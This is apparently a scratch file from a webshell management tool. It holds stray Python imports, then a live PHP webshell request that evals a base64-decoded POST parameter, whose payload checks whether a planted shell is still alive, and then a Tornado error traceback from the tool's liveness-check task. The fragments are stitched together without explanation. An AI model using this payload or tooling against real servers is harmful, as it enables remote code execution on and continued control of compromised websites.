#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from concurrent import futures

futures.ThreadPoolExecutor

import errno


djzqd9527=@eval(base64_decode($_POST[pass]));&pass=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpOwpAc2V0X3RpbWVfbGltaXQoMCk7CmlmKFBIUF9WRVJTSU9OPCc1LjMuMCcpewoJQHNldF9tYWdpY19xdW90ZXNfcnVudGltZSgwKTsKCX07CmVjaG8gInx8LXx8Ijs=


[E 171207 16:25:21 workers:292] 检测webshell存活任务出现错误: local variable 'response' referenced before assignment
    Traceback (most recent call last):
      File "/opt/WebShellManager/apps/tasks/workers.py", line 275, in webshell_test_task
        for obj in obj_set])
      File "/usr/local/python2.7.14/lib/python2.7/site-packages/tornado/gen.py", line 1055, in run
        value = future.result()
      File "/usr/local/python2.7.14/lib/python2.7/site-packages/tornado/concurrent.py", line 238, in result
        raise_exc_info(self._exc_info)
      File "/usr/local/python2.7.14/lib/python2.7/site-packages/tornado/gen.py", line 828, in callback
        result_list.append(f.result())
      File "/usr/local/python2.7.14/lib/python2.7/site-packages/tornado/concurrent.py", line 238, in result
        raise_exc_info(self._exc_info)
      File "/usr/local/python2.7.14/lib/python2.7/site-packages/tornado/gen.py", line 307, in wrapper
        yielded = next(result)
      File "/opt/WebShellManager/apps/webshell/service.py", line 241, in get_base_info
        raise gen.Return(response)
    UnboundLocalError: local variable 'response' referenced before assignment